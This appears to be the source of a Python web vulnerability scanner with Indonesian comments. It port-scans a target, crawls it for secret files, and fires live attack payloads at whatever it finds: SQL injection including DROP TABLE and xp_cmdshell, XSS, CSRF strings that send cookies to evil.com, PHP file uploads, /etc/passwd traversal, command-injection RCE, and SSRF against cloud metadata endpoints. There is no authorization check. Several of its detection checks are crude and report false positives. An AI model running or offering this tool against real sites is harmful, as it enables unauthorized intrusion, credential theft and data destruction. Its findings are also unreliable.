import signal
import sys
import requests
import platform
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin
import socket
import nmap
from requests.exceptions import RequestException, ConnectTimeout
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich.text import Text
from rich.panel import Panel
from rich import box
from rich.logging import RichHandler
import re
import time
import os
import logging
import warnings
from datetime import datetime
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from jinja2 import Template
import queue
from threading import Thread

# Konfigurasi logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()
console = Console()

# Menyembunyikan peringatan
warnings.filterwarnings("ignore")

def clear_screen():
    """Membersihkan layar terminal."""
    if platform.system().lower() == "windows":
        os.system('cls')
    else:
        os.system('clear')

def request_with_retry(url, method='GET', max_retries=3, timeout=10, **kwargs):
    """Melakukan permintaan HTTP dengan logika retry."""
    session = requests.Session()
    retries = Retry(total=max_retries, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    try:
        response = session.request(method, url, timeout=timeout, **kwargs)
        response.raise_for_status()
        return response
    except (ConnectTimeout, RequestException) as e:
        pass
        return None

def detect_waf(url):
    """Mendeteksi Web Application Firewall (WAF) pada URL target."""
    waf_patterns = {
        'Cloudflare': 'cf-ray',
        'AWS WAF': 'x-amzn-waf',
        'ModSecurity': 'modsecurity',
        'Sucuri': 'x-sucuri-id',
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    response = request_with_retry(url, headers=headers)
    if response:
        for waf, pattern in waf_patterns.items():
            if any(pattern.lower() in header.lower() for header in response.headers):
                return waf
    return None

def gather_info(target_url):
    """Mengumpulkan informasi tentang URL target termasuk IP, port terbuka, dan header."""
    if not target_url.startswith(('http://', 'https://')):
        target_url = "http://" + target_url

    parsed_url = urlparse(target_url)
    ip_address = socket.gethostbyname(parsed_url.hostname)

    scanner = nmap.PortScanner()
    open_ports = []
    try:
        scanner.scan(ip_address, '1-1024')
        open_ports = [port for port in scanner[ip_address]['tcp'] if scanner[ip_address]['tcp'][port]['state'] == 'open']
    except Exception as e:
        console.print(f"[bold red]Pemindaian Nmap gagal: {e}[/bold red]")

    response = request_with_retry(target_url)
    headers = response.headers if response else "Tidak ada respons yang diterima."

    return {
        "Alamat IP": ip_address,
        "Port Terbuka": open_ports,
        "Header": headers,
    }

def crawl_website(start_url):
    """Merayapi situs web mulai dari URL yang diberikan untuk menemukan file dan direktori sensitif, serta form input."""
    urls_to_visit = {start_url}
    visited_urls = set()
    crawled_data = []
    form_data = []

    # Regex pattern untuk file dan direktori sensitif
    sensitive_file_patterns = [
        r'\.env$', r'\.git$', r'\.htaccess$', r'config\.php$', r'backup$', r'database$', r'\.bak$', r'\.sql$',
        r'\.log$', r'\.json$', r'\.yaml$', r'config\.js$', r'\.old$', r'\.inc$', r'web\.config$', r'wp-config$',
        r'admin$', r'private$', r'staging$', r'test$', r'archive$', r'old$', r'remote\.php$', r'config\.bak$',
        r'\.pem$', r'\.key$', r'\.crt$', r'credentials$', r'secret$', r'\.htpasswd$', r'sensitive$', r'passwords$', r'secrets$',
        r'\.backup$', r'\.tmp$', r'\.swp$', r'\.swo$'
    ]

    # Menambah URL dengan regex tambahan
    additional_regex = [
        r'/\.\./', r'~$', r'~1$', r'~2$', r'\.gitignore$', r'\.DS_Store$'
    ]

    accessible_folders = set()
    forbidden_folders = set()

    while urls_to_visit:
        url = urls_to_visit.pop()
        if url in visited_urls:
            continue

        visited_urls.add(url)
        try:
            response = request_with_retry(url)

            # Abaikan respons dengan status kode 400-an
            if response and 400 <= response.status_code < 500:
                continue

            if response is None or not response.text.strip():
                continue

            if response.status_code == 403:
                forbidden_folders.add(url)
                continue

            try:
                content_type = response.headers.get('Content-Type', '')
                if 'html' not in content_type.lower():
                    continue

                soup = BeautifulSoup(response.text, 'html.parser')
            except Exception:
                # Abaikan kesalahan saat parsing HTML
                continue

            domain = urlparse(url).netloc
            params = parse_qs(urlparse(url).query)

            # Cek semua link dan file sensitif
            for link in soup.find_all('a', href=True):
                full_url = urljoin(url, link['href'])
                if urlparse(full_url).netloc == domain and full_url not in visited_urls:
                    if any(re.search(pattern, full_url) for pattern in sensitive_file_patterns + additional_regex):
                        if full_url not in [data.get("url") for data in crawled_data]:
                            crawled_data.append({"url": full_url, "details": "Potensi file sensitif ditemukan."})
                    urls_to_visit.add(full_url)

            # Menyimpan informasi form input
            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').upper()
                form_action_url = urljoin(url, action) if action else url

                inputs = form.find_all('input')
                form_fields = []
                for input_tag in inputs:
                    name = input_tag.get('name')
                    type_ = input_tag.get('type', 'text')
                    form_fields.append({'name': name, 'type': type_})

                form_data.append({
                    'url': form_action_url,
                    'method': method,
                    'fields': form_fields
                })

            if url not in [data.get("url") for data in crawled_data]:
                crawled_data.append({"url": url, "params": params})

            accessible_folders.add(url)

        except Exception:
            # Abaikan kesalahan tanpa menampilkan pesan error di konsol
            pass

    return crawled_data, accessible_folders, forbidden_folders, form_data


def test_vulnerabilities(crawled_data, form_data):
    """Mengujicoba berbagai kerentanan pada data yang telah di-crawl dan form input menggunakan sistem antrian."""
    vulnerabilities = []
    q = queue.Queue()

    # Deteksi WAF jika ada data yang di-crawl
    detected_waf = detect_waf(crawled_data[0]['url']) if crawled_data else None
    if detected_waf:
        # Menampilkan deteksi WAF hanya jika diperlukan
        pass

    # Fungsi untuk melakukan pengujian kerentanan
    def process_vulnerability(data, is_form=False):
        if not is_form:  # Jika data adalah URL yang di-crawl
            for test_func in [test_sql_injection, test_xss, test_csrf, test_file_upload, test_directory_traversal, test_rce, test_ssrf, test_open_redirect]:
                try:
                    vulnerabilities.extend(test_func(data))
                except Exception as e:
                    # Abaikan error 400-an untuk semua proses pengujian URL
                    if hasattr(e, 'response') and 400 <= e.response.status_code < 500:
                        pass
                    else:
                        # Abaikan tampilan pesan error
                        pass
        else:  # Jika data adalah form input
            url = data['url']
            method = data['method']
            fields = data['fields']

            if method == 'POST':
                payloads = {field['name']: "'=''or'" for field in fields}
                try:
                    response = request_with_retry(url, method='POST', data=payloads)
                    if response and response.status_code == 200:
                        vulnerabilities.append({
                            'URL': url,
                            'Vulnerability': 'Form POST dapat diakses dengan data uji',
                            'Details': 'Form ini dapat mengakses dengan data POST'
                        })
                except Exception as e:
                    # Abaikan error 400-an untuk semua proses pengujian form
                    if hasattr(e, 'response') and 400 <= e.response.status_code < 500:
                        pass
                    else:
                        # Abaikan tampilan pesan error
                        pass
            else:
                vulnerabilities.append({
                    'URL': url,
                    'Vulnerability': 'Form GET tidak diuji karena metode GET',
                    'Details': 'Form ini tidak dapat diuji dengan POST'
                })

    # Tambahkan semua URL yang di-crawl ke dalam antrian
    for entry in crawled_data:
        url = entry['url']
        params = entry.get('params', {})
        data = {'url': url, 'params': params}
        q.put((data, False))  # False menandakan ini adalah URL

    # Tambahkan semua form input ke dalam antrian
    for form in form_data:
        q.put((form, True))  # True menandakan ini adalah form

    # Fungsi worker untuk memproses item dari antrian
    def worker():
        while not q.empty():
            item, is_form = q.get()
            process_vulnerability(item, is_form)
            q.task_done()

    # Membuat thread untuk paralelisme
    with Progress("[cyan]Mengujicoba kerentanan", "[green]Sedang berjalan....[/green]", console=None) as progress:
        task = progress.add_task("[cyan]Mengujicoba kerentanan...", total=q.qsize())

        num_threads = 5  # Atur jumlah thread
        threads = []
        for _ in range(num_threads):
            thread = Thread(target=worker)
            thread.start()
            threads.append(thread)

        # Tunggu sampai semua item dalam antrian selesai
        for thread in threads:
            thread.join()

        progress.update(task, completed=True)

    return vulnerabilities


def test_sql_injection(data):
    """Mengujicoba SQL Injection pada URL."""
    vulnerabilities = []
    url = data['url']
    params = data['params']

    sql_payloads = {
        "Basic Single Quote": "'",
        "Basic OR True": "' OR '1'='1",
        "OR True Commented": "' OR '1'='1' --",
        'Double Quote OR True': '" OR "1"="1',
        'Double Quote OR True Commented': '" OR "1"="1" --',
        "Numeric OR True": '1 OR 1=1',
        "Single Quote OR True": '1\' OR \'1\'=\'1',
        "Numeric OR True Commented": '1 OR 1=1 --',
        "DROP Table Payload": '1 DROP TABLE users --',
        "Admin Commented": 'admin\' --',
        "Admin Commented Hash": 'admin\' #',
        "Single Quote OR True Commented": '\' OR 1=1 --',
        "Single Quote OR True Commented Escaped": '\' OR \'1\'=\'1\' --',

        # Common and latest SQL Injection payloads
        "Union Select": "' UNION SELECT NULL, NULL, NULL --",
        "Union Select with Comment": "' UNION SELECT NULL, NULL, NULL -- -",
        "Union Select with Additional Columns": "' UNION SELECT NULL, @@version --",
        "Time-Based Blind Injection": "' OR IF(1=1, SLEEP(5), 0) --",
        "Boolean-Based Blind Injection": "' AND 1=1 --",
        "Boolean-Based Blind Injection False": "' AND 1=2 --",
        "Error-Based Injection": "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "Second Order Injection": "1' AND 1=CONVERT(int, (SELECT @@version)) --",
        "Bobby Tables": "'; EXEC xp_cmdshell('dir') --",
        "Custom Error Message": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND() * 2)) x FROM information_schema.tables GROUP BY x) a) --"
    }

    error_patterns = [
        'sql syntax', 'mysql', 'syntax error', 'error in your sql syntax',
        'unclosed quotation mark', 'warning: mysql', 'sql server', 'database error'
    ]

    for param in params:
        for description, payload in sql_payloads.items():
            # Menyusun URL dengan payload
            test_url = f"{url}{payload}"
            try:
                response = request_with_retry(test_url)
                
                if response:
                    # Abaikan respons dengan status kode 400-an
                    if 400 <= response.status_code < 500:
                        continue

                    response_text = response.text.lower()

                    # Mengecek keberadaan pola kesalahan SQL
                    if any(re.search(pattern, response_text) for pattern in error_patterns):
                        vulnerabilities.append({
                            'URL': test_url,
                            'Payload': payload,
                            'Payload Description': description,
                            'Vulnerability': 'SQL Injection',
                            'Details': 'Response menunjukkan kemungkinan SQL Injection berdasarkan pola kesalahan SQL.'
                        })
                    elif 'syntax error' in response_text:
                        vulnerabilities.append({
                            'URL': test_url,
                            'Payload': payload,
                            'Payload Description': description,
                            'Vulnerability': 'SQL Injection',
                            'Details': 'Response menunjukkan kemungkinan SQL Injection berdasarkan kesalahan sintaks SQL.'
                        })
            except Exception:
                # Abaikan error 400-an dan tidak menampilkan pesan error
                pass

    return vulnerabilities

def test_xss(data):
    """Mengujicoba XSS pada URL."""
    vulnerabilities = []
    url = data['url']
    params = data['params']

    xss_payloads = {
        "Basic Script Alert": "' <script>alert(1)</script>",
        "Image OnError": "' ><img src=x onerror=alert(1)>",
        "SVG OnLoad": "' <svg onload=alert(1)>",
        "Body OnLoad": "' <body onload=alert(1)>",
        "Iframe JavaScript": "' <iframe src='javascript:alert(1)'>",
        
        # More payloads for various XSS types
        "Event Handler": "' <div onmouseover=alert(1)>Hover me</div>",
        "JavaScript URL": "' <a href='javascript:alert(1)'>Click me</a>",
        "Form Input": "' <form><input type='text' value='<script>alert(1)</script>'></form>",
        "DOM-based XSS": "' <script>document.body.innerHTML = '<img src=x onerror=alert(1)>'</script>",
        "Data URL": "' <a href='data:text/html,<script>alert(1)</script>'>Link</a>",
        "WebSocket": "' <script>var ws = new WebSocket('ws://example.com'); ws.onmessage = function(event) { alert(1) }</script>"
    }

    for param in params:
        for description, payload in xss_payloads.items():
            test_url = f"{url}{payload}"
            try:
                response = request_with_retry(test_url)
                
                if response:
                    # Abaikan respons dengan status kode 400-an
                    if 400 <= response.status_code < 500:
                        continue

                    response_text = response.text.lower()

                    # Cek pola XSS dalam respons
                    xss_patterns = [
                        re.compile(r'<script.*?>.*?</script>', re.IGNORECASE),
                        re.compile(r'on\w+=.*?alert\(1\)', re.IGNORECASE),
                        re.compile(r'javascript:.*?alert\(1\)', re.IGNORECASE),
                        re.compile(r'data:text/html,.*?<script.*?>.*?</script>', re.IGNORECASE),
                        re.compile(r'base64,.*?PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+', re.IGNORECASE)
                    ]
                    
                    if any(pattern.search(response_text) for pattern in xss_patterns):
                        vulnerabilities.append({
                            'URL': test_url,
                            'Payload': payload,
                            'Payload Description': description,
                            'Vulnerability': 'XSS',
                            'Details': 'Response menunjukkan kemungkinan XSS berdasarkan pola deteksi XSS.'
                        })
            except Exception:
                # Abaikan error 400-an dan tidak menampilkan pesan error
                pass

    return vulnerabilities

def test_csrf(data):
    """Mengujicoba CSRF pada URL."""
    vulnerabilities = []
    url = data['url']
    
    csrf_payloads = {
        "Image Request": '<img src="http://evil.com/csrf?cookie=' + data['params'].get('cookie', '') + '" />',
        "Form Submission": '<form action="http://evil.com/csrf" method="POST"><input type="hidden" name="cookie" value="' + data['params'].get('cookie', '') + '"></form>',
        "Hidden Iframe": '<iframe src="http://evil.com/csrf" style="display:none;"></iframe>',
        
        # Additional payloads
        "URL with Cookie": f'<img src="http://evil.com/csrf?cookie={data["params"].get("cookie", "")}" />',
        "Redirect Form": '<form action="http://evil.com/csrf" method="GET"><input type="hidden" name="redirect" value="http://example.com"></form>',
        "XMLHttpRequest": '<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "http://evil.com/csrf", true); xhr.send("cookie=' + data['params'].get('cookie', '') + '");</script>',
        "AJAX Request": '<script>fetch("http://evil.com/csrf", { method: "POST", body: "cookie=' + data['params'].get('cookie', '') + '" });</script>',
        "Form with Multiple Actions": '<form action="http://evil.com/csrf1" method="POST"><input type="hidden" name="cookie" value="' + data['params'].get('cookie', '') + '"></form><form action="http://evil.com/csrf2" method="POST"><input type="hidden" name="cookie" value="' + data['params'].get('cookie', '') + '"></form>',
        "CSRF Token Test": '<form action="http://example.com/submit" method="POST"><input type="hidden" name="csrf_token" value="test_token"></form>'
    }

    for description, payload in csrf_payloads.items():
        try:
            # Menggunakan metode POST untuk uji CSRF
            response = request_with_retry(url, method='POST', data={'payload': payload})
            
            if response:
                # Abaikan respons dengan status kode 400-an
                if 400 <= response.status_code < 500:
                    continue

                response_text = response.text.lower()

                # Indikator untuk mendeteksi kemungkinan kerentanan CSRF
                csrf_indicators = [
                    'unauthorized', 'forbidden', 'access denied', 'csrf token', 'csrf attack'
                ]
                
                if any(indicator in response_text for indicator in csrf_indicators):
                    vulnerabilities.append({
                        'URL': url,
                        'Payload': payload,
                        'Payload Description': description,
                        'Vulnerability': 'CSRF',
                        'Details': 'Response menunjukkan kemungkinan kerentanan CSRF berdasarkan indikator dalam respons.'
                    })
        except Exception:
            # Abaikan error 400-an dan tidak menampilkan pesan error
            pass
    
    return vulnerabilities

def test_file_upload(data):
    """Mengujicoba upload file pada URL."""
    vulnerabilities = []
    url = data['url']

    # Payloads untuk pengujian file upload
    upload_payloads = {
        "Text File": ('test.txt', 'This is a test file.'),
        "PHP File": ('test.php', '<?php phpinfo(); ?>'),
        "ASP File": ('test.asp', '<% response.write "test" %>'),
        "JSP File": ('test.jsp', '<%= new java.util.Date() %>'),
        "HTML File": ('test.html', '<html><body>test</body></html>'),
        "Executable": ('test.exe', b'PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00test'),
        "Script File": ('test.js', 'console.log("test");'),
        "XML File": ('test.xml', '<?xml version="1.0"?><root>test</root>'),
        "SVG File": ('test.svg', '<svg onload="alert(\'test\')"></svg>'),
        "ZIP File": ('test.zip', b'PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00test'),
        "GIF File": ('test.gif', b'GIF89a\x01\x00\x01\x00\xF7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00test')
    }

    for description, (filename, content) in upload_payloads.items():
        try:
            response = request_with_retry(url, method='POST', files={'file': (filename, content)})
            
            # Abaikan respons dengan status kode 400-an
            if response and 400 <= response.status_code < 500:
                continue

            if response:
                response_text = response.text.lower()
                
                # Cek apakah file dapat diakses atau dieksekusi
                parsed_url = urlparse(url)
                file_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{filename}"

                # Uji akses file yang diunggah
                file_response = request_with_retry(file_url)
                if file_response and response_text != file_response.text.lower():
                    vulnerabilities.append({
                        'URL': url,
                        'Payload': filename,
                        'Payload Description': description,
                        'Vulnerability': 'File Upload',
                        'Details': f'File {filename} berhasil diunggah dan dapat diakses atau dieksekusi.'
                    })

        except Exception:
            # Abaikan kesalahan tanpa menampilkan pesan error di konsol
            pass

    return vulnerabilities

def test_directory_traversal(data):
    """Mengujicoba directory traversal pada URL."""
    vulnerabilities = []
    url = data['url']
    params = data['params']

    # Payloads untuk pengujian directory traversal
    traversal_payloads = {
        "Basic Traversal": '../../../../../etc/passwd',
        "Encoded Traversal": '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
        "Absolute Path": '/etc/passwd',
        "Process Environment": '/proc/self/environ',
        "Hostname": '/etc/hostname',
        
        # Payload tambahan untuk pengujian lebih mendalam
        "Double Dot Traversal": '..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
        "Encoded Double Dot": '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
        "Null Byte Injection": '../../../../../etc/passwd%00',
        "Root Directory Traversal": '/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd',
        "Directory Traversal with Double Encoding": '%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
        "Path Traversal with Unicode Encoding": '%u202e%u202e%u202e%u202e%u202e%u202e%u202e%u202e/etc/passwd'
    }

    for param in params:
        for description, payload in traversal_payloads.items():
            test_url = f"{url}{payload}"
            try:
                response = request_with_retry(test_url)

                # Abaikan respons dengan status kode 400-an
                if response and 400 <= response.status_code < 500:
                    continue

                if response:
                    response_text = response.text.lower()

                    # Cek pola kerentanan traversal di respons
                    directory_traversal_indicators = [
                        re.compile(r'root:x', re.IGNORECASE),  # Misal output dari file /etc/passwd
                        re.compile(r'(error|forbidden|denied|not found)', re.IGNORECASE)
                    ]

                    if any(indicator.search(response_text) for indicator in directory_traversal_indicators):
                        vulnerabilities.append({
                            'URL': test_url,
                            'Payload': payload,
                            'Payload Description': description,
                            'Vulnerability': 'Directory Traversal',
                            'Details': 'Response menunjukkan kemungkinan kerentanan directory traversal berdasarkan pola deteksi.'
                        })

            except Exception:
                # Abaikan kesalahan tanpa menampilkan pesan error di konsol
                pass

    return vulnerabilities

def test_rce(data):
    """Mengujicoba Remote Code Execution (RCE) pada URL."""
    vulnerabilities = []
    url = data['url']
    
    # Payload untuk pengujian RCE
    rce_payloads = {
        "Basic PHP Commands": [
            'system("ls")', 'exec("whoami")', 'shell_exec("id")', 'passthru("uname -a")',
            'popen("cat /etc/passwd")', 'eval("phpinfo()")'
        ],
        "Advanced PHP Commands": [
            'eval(base64_decode("c2lzdGVtKCIuLmxvY2FsLyIuIik="))',  # base64 encoded: system("ls")
            'assert("phpinfo()")', 'preg_replace("/.*/e", "phpinfo()", "")'
        ],
        "Command Injection": [
            '; ls', '&& whoami', '| id', '`cat /etc/passwd`', '$(uname -a)'
        ],
        "Node.js Commands": [
            'require("child_process").exec("ls", (error, stdout, stderr) => console.log(stdout))',
            'require("fs").writeFileSync("/tmp/test.txt", "test")'
        ],
        "Python Commands": [
            'import os; os.system("ls")', 'import subprocess; subprocess.call(["whoami"])'
        ]
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for param in data.get('params', []):
        for payload_set_name, payloads in rce_payloads.items():
            for payload in payloads:
                test_data = {param: payload}
                try:
                    response = request_with_retry(url, method='POST', data=test_data, headers=headers)
                    
                    # Abaikan respons dengan status kode 400-an
                    if response and 400 <= response.status_code < 500:
                        continue
                    
                    if response:
                        response_text = response.text.lower()

                        # Cek pola output yang menunjukkan kemungkinan RCE
                        rce_indicators = [
                            re.compile(r'(root|www-data|uid=|uname -a)', re.IGNORECASE),
                            re.compile(r'(error|exception|failed)', re.IGNORECASE)
                        ]

                        if any(indicator.search(response_text) for indicator in rce_indicators):
                            vulnerabilities.append({
                                'URL': url,
                                'Payload': payload,
                                'Payload Set': payload_set_name,
                                'Vulnerability': 'RCE',
                                'Details': 'Response menunjukkan kemungkinan Remote Code Execution berdasarkan output yang ditemukan.'
                            })

                except Exception:
                    # Abaikan kesalahan tanpa menampilkan pesan error di konsol
                    pass

    return vulnerabilities

def test_ssrf(data):
    """Mengujicoba Server-Side Request Forgery (SSRF) pada URL."""
    vulnerabilities = []
    url = data['url']

    # Payload untuk pengujian SSRF
    ssrf_payloads = {
        "Localhost and Internal IPs": [
            'http://localhost', 'http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/',
            'http://internal.local', 'http://internal.test', 'http://localhost/admin',
            'http://127.0.0.1:8080', 'http://[::1]', 'http://0.0.0.0'
        ],
        "Private IP Ranges": [
            'http://10.0.0.1', 'http://172.16.0.1', 'http://192.168.0.1',
            'http://10.10.10.10', 'http://172.31.255.255', 'http://192.168.1.1'
        ],
        "Metadata Services": [
            'http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/identity-docs/', 'http://169.254.169.254/latest/role-arn/',
            'http://169.254.169.254/latest/meta-data/instance-id'
        ],
        "Cloud Providers": [
            'http://169.254.169.254', 'http://metadata.google.internal', 'http://aws.amazon.com/metadata',
            'http://cloudflare.com/metadata'
        ],
        "Out of Scope": [
            'http://example.com', 'http://google.com', 'http://github.com'
        ]
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for param in data.get('params', []):
        for description, payloads in ssrf_payloads.items():
            for payload in payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    response = request_with_retry(test_url)
                    
                    # Abaikan respons dengan status kode 400-an
                    if response and 400 <= response.status_code < 500:
                        continue
                    
                    if response:
                        response_text = response.text.lower()

                        # Cek pola respons yang menunjukkan kemungkinan SSRF
                        ssrf_indicators = [
                            re.compile(r'(meta-data|role-arn|identity-docs)', re.IGNORECASE),
                            re.compile(r'(localhost|127.0.0.1|169.254.169.254|internal|example\.com)', re.IGNORECASE),
                            re.compile(r'(error|failed|not found|forbidden)', re.IGNORECASE)
                        ]

                        if any(indicator.search(response_text) for indicator in ssrf_indicators):
                            vulnerabilities.append({
                                'URL': test_url,
                                'Payload': payload,
                                'Payload Description': description,
                                'Vulnerability': 'SSRF',
                                'Details': 'Response menunjukkan kemungkinan SSRF berdasarkan output yang ditemukan.'
                            })

                except Exception:
                    # Abaikan kesalahan tanpa menampilkan pesan error di konsol
                    pass

    return vulnerabilities

def test_open_redirect(data):
    """Mengujicoba Open Redirect pada URL."""
    vulnerabilities = []
    url = data['url']
    params = data['params']

    # Payload untuk pengujian Open Redirect
    redirect_payloads = {
        "Basic Redirects": [
            'http://evil.com', 'https://malicious.com'
        ],
        "JavaScript and Data URIs": [
            'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>',
            'javascript:document.location="http://evil.com"', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
        ],
        "Internal and Local Redirects": [
            'http://localhost', 'http://127.0.0.1', 'http://internal.local', 
            'http://internal.test', 'http://example.com'
        ],
        "Redirect via URL Encoding": [
            'http%3A%2F%2Fevil.com', 'https%3A%2F%2Fmalicious.com', 
            'javascript%3Aalert%281%29', 'data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
        ]
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for param in params:
        for description, payloads in redirect_payloads.items():
            for payload in payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    response = request_with_retry(test_url)

                    # Abaikan respons dengan status kode 400-an
                    if response and 400 <= response.status_code < 500:
                        continue

                    if response:
                        response_url = response.url
                        response_text = response.text.lower()

                        # Cek pola respons untuk indikasi Open Redirect
                        redirect_indicators = [
                            re.compile(r'(evil\.com|malicious\.com|localhost|127\.0\.0\.1|internal\.local|internal\.test|example\.com)', re.IGNORECASE),
                            re.compile(r'(alert\(1\)|<script>alert\(1\)</script>)', re.IGNORECASE),
                            re.compile(r'(location\.href|document\.location|window\.location)', re.IGNORECASE),
                            re.compile(r'(redirected|redirects)', re.IGNORECASE)
                        ]

                        if any(indicator.search(response_url) for indicator in redirect_indicators) or \
                           any(indicator.search(response_text) for indicator in redirect_indicators):
                            vulnerabilities.append({
                                'URL': test_url,
                                'Payload': payload,
                                'Payload Description': description,
                                'Vulnerability': 'Open Redirect',
                                'Details': 'Response menunjukkan kemungkinan open redirect berdasarkan output yang ditemukan.'
                            })

                except Exception:
                    # Abaikan kesalahan tanpa menampilkan pesan error di konsol
                    pass

    return vulnerabilities

def generate_html_report(crawled_data, vulnerabilities, url, date):
    """Menghasilkan laporan HTML untuk hasil pengujian dan data yang telah di-crawl."""
    
    # Kelompokkan kerentanan berdasarkan kategori
    categorized_vulnerabilities = {}
    for vuln in vulnerabilities:
        category = vuln.get('Vulnerability', 'Uncategorized')
        if category not in categorized_vulnerabilities:
            categorized_vulnerabilities[category] = []
        categorized_vulnerabilities[category].append(vuln)
    
    html_template = """
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Laporan Keamanan Website</title>
        <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdn.datatables.net/1.10.21/css/jquery.dataTables.min.css" rel="stylesheet">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
        <style>
            body { font-family: Arial, sans-serif; background-color: #f8f9fa; }
            .header { margin-bottom: 30px; text-align: center; }
            .header h1 { font-size: 36px; color: #343a40; }
            .header p { font-size: 18px; color: #6c757d; }
            .table th, .table td { text-align: center; vertical-align: middle; }
            .table { margin-bottom: 30px; background-color: #ffffff; }
            .footer { margin-top: 50px; text-align: center; padding: 20px 0; background-color: #343a40; color: white; }
            .footer p { font-size: 14px; margin-bottom: 0; }
            .vulnerability-header { color: #ff4d4d; }
            .vulnerability-header i { margin-right: 5px; }
            .container { max-width: 90%; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Laporan Keamanan Website</h1>
                <p>Dihasilkan pada {{ date }}</p>
            </div>

            <h2>Informasi Target</h2>
            <table class="table table-bordered table-striped" id="infoTable">
                <thead class="thead-dark">
                    <tr>
                        <th>Informasi</th>
                        <th>Detail</th>
                    </tr>
                </thead>
                <tbody>
                    {% for key, value in info.items() %}
                    <tr>
                        <td>{{ key }}</td>
                        <td>{{ value }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>

            <h2>Hasil Pemindaian</h2>
            <table class="table table-bordered table-hover" id="crawledDataTable">
                <thead class="thead-light">
                    <tr>
                        <th>URL</th>
                        <th>Detail</th>
                    </tr>
                </thead>
                <tbody>
                    {% for data in crawled_data %}
                    <tr>
                        <td>{{ data.url }}</td>
                        <td>{{ data.details }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>

            <h2>Kerentanan Berdasarkan Kategori</h2>
            {% for category, vuls in categorized_vulnerabilities.items() %}
                <div class="vulnerability-header">
                    <h3><i class="fas fa-exclamation-triangle"></i> {{ category }}</h3>
                </div>
                <table class="table table-bordered table-responsive-md table-striped" id="vulnerabilitiesTable_{{ loop.index }}">
                    <thead class="thead-light">
                        <tr>
                            <th>URL</th>
                            <th>Vulnerability</th>
                            <th>Severity</th>
                            <th>Description</th>
                            <th>Remediation</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for vuln in vuls %}
                        <tr>
                            <td>{{ vuln.URL }}</td>
                            <td>{{ vuln.Vulnerability }}</td>
                            <td>{{ vuln.Severity }}</td>
                            <td>{{ vuln.Details }}</td>
                            <td>{{ vuln.Remediation }}</td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            {% endfor %}

            <div class="footer">
                <p>Laporan dihasilkan oleh Alat Pengujian Keamanan Web &copy; 2024</p>
            </div>
        </div>

        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.datatables.net/1.10.21/js/jquery.dataTables.min.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
        <script>
            $(document).ready(function() {
                $('#infoTable').DataTable({
                    "paging": false,
                    "searching": false
                });
                $('#crawledDataTable').DataTable({
                    "paging": true,
                    "searching": true,
                    "ordering": true
                });
                
                {% for category in categorized_vulnerabilities.keys() %}
                $('#vulnerabilitiesTable_{{ loop.index }}').DataTable({
                    "paging": true,
                    "searching": true,
                    "ordering": true
                });
                {% endfor %}
            });
        </script>
    </body>
    </html>
    """

    # Render template dengan data
    template = Template(html_template)
    rendered_html = template.render(
        date=datetime.now().strftime("%Y-%m-%d %H-%M-%S"),
        info=gather_info(url),  # Masukkan URL yang sesuai
        crawled_data=crawled_data,
        categorized_vulnerabilities=categorized_vulnerabilities
    )
    
    # Simpan laporan ke file HTML
    with open("report_{}.html".format(date), "w") as file:
        file.write(rendered_html)



def signal_handler(sig, frame):
    """Menangani sinyal interupsi (CTRL+C)."""
    print("\n[INFO] Program dihentikan oleh pengguna.")
    sys.exit(0)


def main():
    clear_screen()
    signal.signal(signal.SIGINT, signal_handler)

    # Tampilan Header dengan Rich
    console.print(Panel(
        Text("""
    ============================================
               .---------       `---------.      `.-://::.``---  .----------------`    
   sddddddddd:      oddddddddd/    .+yddmmmmmdhsddd` +dddddddddddddddd:    
